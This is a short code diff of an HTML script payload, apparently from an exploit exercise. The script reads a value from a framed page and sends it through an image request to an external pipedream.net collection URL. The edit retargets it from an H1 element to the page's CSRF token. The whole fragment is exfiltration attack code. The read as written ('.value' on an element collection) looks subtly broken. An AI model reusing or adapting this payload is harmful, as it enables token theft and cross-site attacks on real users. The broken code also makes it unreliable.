@@ -19,7 +19,7 @@
  <SCRIPT>
           var iframe = document.getElementById("myFrame");
           iframe.addEventListener("load", function() {
-            var elmnt = iframe.contentWindow.document.getElementsByTagName("H1").value;
+            var elmnt = iframe.contentWindow.document.getElementsByName("csrf").value;
             var img = new  Image(); img.src="https://enmsdn4h0gw.x.pipedream.net/" + elmnt;
           });
 </SCRIPT>
